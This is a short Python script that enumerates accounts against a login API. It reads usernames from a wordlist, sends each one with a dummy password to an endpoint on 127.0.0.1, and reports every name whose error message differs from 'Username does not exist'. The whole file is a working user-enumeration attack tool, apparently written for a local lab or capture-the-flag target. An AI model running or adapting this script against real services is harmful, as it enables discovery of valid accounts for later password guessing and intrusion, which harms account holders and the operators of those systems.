import requests
import json
import argparse

usernames_file = 'wordlists/usernames.txt'
password = 'dummy_password'
url = 'http://127.0.0.1/api/logIn'
error_message = 'Username does not exist'

def attempt_login(username, verbose):
    payload = {
        'username': username,
        'password': password
    }

    headers = {
        'Content-Type': 'application/json',
    }

    try:
        response = requests.post(url, json=payload, headers=headers)

        try:
            response_data = response.json()
            if 'error' in response_data and response_data['error'] == error_message:
                if verbose:
                    print(f"Username '{username}' does not exist.")
            else:
                print(f"Login attempt for '{username}' is successful or the error message is different.")
        except ValueError:
            if verbose:
                print(f"Failed to parse JSON response for username '{username}'.")

    except requests.RequestException as e:
        if verbose:
            print(f"Request failed for username '{username}': {e}")

def main():
    parser = argparse.ArgumentParser(description="Login attempt script.")
    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose output.") # VERBOSE MODE
    args = parser.parse_args()

    with open(usernames_file, 'r') as file:
        usernames = file.readlines()

    for username in usernames:
        username = username.strip()
        if username:
            attempt_login(username, args.verbose)

if __name__ == '__main__':
    main()
